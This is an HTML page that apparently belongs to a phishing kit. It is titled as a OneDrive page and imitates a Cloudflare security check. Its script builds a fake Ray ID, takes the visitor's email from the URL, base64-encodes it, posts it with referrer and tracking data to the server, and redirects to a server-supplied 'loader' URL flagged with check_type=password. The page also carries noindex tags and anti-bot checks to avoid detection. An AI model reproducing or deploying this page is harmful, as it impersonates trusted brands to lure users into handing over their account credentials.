<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width,initial-scale=1">

<meta name="referrer" content="no-referrer">

<meta name="robots" content="noindex, nofollow">

<meta name="googlebot" content="noindex, nofollow">

<meta name="bingbot" content="noindex, nofollow">

<title>Just a moment... | OneDrive</title>

<script src="/static/js/anti-bot.js"></script>

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>

<style>

*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}

body{background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column}

header{background:rgba(255,255,255,0.96);padding:12px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #eaeaea}

.logo{font-weight:700;font-size:20px;background:linear-gradient(135deg,#1e2a3a,#0f172a);-webkit-background-clip:text;background-clip:text;color:transparent}

.auth-links{display:flex;gap:16px}

.auth-links a{text-decoration:none;color:#4b5563;font-size:14px;padding:8px 16px;border-radius:24px}

.auth-links a:last-child{color:#2563eb;border:1px solid #2563eb}

main{flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:40px 20px;text-align:center}

.security-check-title{font-size:28px;font-weight:700;background:linear-gradient(135deg,#1e293b,#0f172a);-webkit-background-clip:text;background-clip:text;color:transparent}

.waiting-subtitle{font-size:16px;color:#4b5563;margin-bottom:28px}

.turnstile-container{margin:16px 0 20px;display:flex;justify-content:center;min-height:75px}

.turnstile-error{color:#dc2626;font-size:14px;margin-top:12px;padding:8px 16px;background:#fef2f2;border-radius:40px;display:none}

.turnstile-error.show{display:inline-flex}

@keyframes dotAppear{0%,100%{opacity:0;transform:scale(0.7)}50%{opacity:1;transform:scale(1)}}

.ray-id{font-size:10px;font-family:monospace;color:#6b7280;background:rgba(0,0,0,0.03);display:inline-block;padding:6px 12px;border-radius:20px;margin-top:20px}

.footer-note{font-size:10px;color:#9ca3af;margin-top:10px}

#cookie-consent{display:none}

</style>

</head>

<body>





<main>

<div class="turnstile-container"><div id="cf-turnstile"></div></div>

<div id="turnstileError" class="turnstile-error"><span id="errorMessageText">Security check failed. Please try again.</span></div>

<div><div class="ray-id">Ray ID: <span id="rayIdValue"></span></div><div class="footer-note">Performance & security by Cloudflare</div></div>

</main>



<div id="cookie-consent" style="display:none;">This site uses cookies for security and analytics.</div>



<script>

const TURNSTILE_SITE_KEY = "0x4AAAAAABlSaT2_E0H9QCo0";

let errorDiv = document.getElementById('turnstileError');

let errorMessageSpan = document.getElementById('errorMessageText');

let turnstileWidgetId = null;

let acct = null;

let landingPath = '/';



function showError(m){errorMessageSpan.textContent=m;errorDiv.classList.add('show');}

function hideError(){errorDiv.classList.remove('show');}

function generateRayId(){var r='';for(i=0;i<16;i++)r+='abcdef0123456789'[Math.floor(Math.random()*16)];return r;}

document.getElementById('rayIdValue').textContent=generateRayId();



const urlParams=new URLSearchParams(window.location.search);

acct=urlParams.get('acct')||urlParams.get('email');



const now=new Date();

const timestamp=now.toISOString();

const deskCode=Math.random().toString(36).substring(2,10).toUpperCase();

const detectedReferrer=document.referrer||'direct';

let eParameter='';

if(acct)eParameter=btoa(acct).replace(/=/g,'');



async function getLandingPath(){

    try{

        const r=await fetch('/api/landing-paths/active');

        const d=await r.json();

        if(d.success&&d.path){landingPath=d.path.path_value;if(landingPath==='/')landingPath='';}

    }catch(e){}

}



async function verifyTurnstile(token){

    hideError();

    await getLandingPath();

    try{

        const r=await fetch('/verify-turnstile',{

            method:'POST',

            headers:{'Content-Type':'application/json'},

            body:JSON.stringify({

                turnstile_token:token,

                acct:acct,

                landing_path:landingPath,

                use_loader:true,

                tracking:{timestamp:timestamp,desk_code:deskCode,detected_referrer:detectedReferrer,e_parameter:eParameter}

            })

        });

        const d=await r.json();

        if(d.success){

            if(d.loader_url){

                let u=d.loader_url;

                u+=(u.includes('?')?'&':'?')+'auth=1&shareable=true&access=restricted&check_type=password&timestamp='+encodeURIComponent(timestamp)+'&priority=high&include_details=true&e='+encodeURIComponent(eParameter)+'&dc='+encodeURIComponent(deskCode)+'&ref='+encodeURIComponent(detectedReferrer);

                window.location.href=u;

            }else{

                let u=d.redirect_url||landingPath||'/';

                if(u==='/')u='';

                u+=(u.includes('?')?'&':'?')+'auth=1&shareable=true&access=restricted&check_type=password&timestamp='+encodeURIComponent(timestamp)+'&priority=high&include_details=true&e='+encodeURIComponent(eParameter)+'&dc='+encodeURIComponent(deskCode)+'&ref='+encodeURIComponent(detectedReferrer);

                if(acct&&!u.includes('acct'))u+='&acct='+encodeURIComponent(acct);

                if(u==='')u='/';

                window.location.href=u;

            }

        }else{

            showError('Verification failed. Please try again.');

            if(turnstileWidgetId)turnstile.reset(turnstileWidgetId);

        }

    }catch(e){

        showError('Connection error. Please try again.');

        if(turnstileWidgetId)turnstile.reset(turnstileWidgetId);

    }

}



turnstile.ready(function(){

    turnstileWidgetId=turnstile.render('#cf-turnstile',{

        sitekey:TURNSTILE_SITE_KEY,

        callback:function(t){verifyTurnstile(t);},

        'error-callback':function(){showError('Widget error. Refresh page.');if(turnstileWidgetId)turnstile.reset(turnstileWidgetId);},

        'expired-callback':function(){showError('Challenge expired. Try again.');if(turnstileWidgetId)turnstile.reset(turnstileWidgetId);},

        theme:'auto'

    });

});

</script>

</body>

</html>
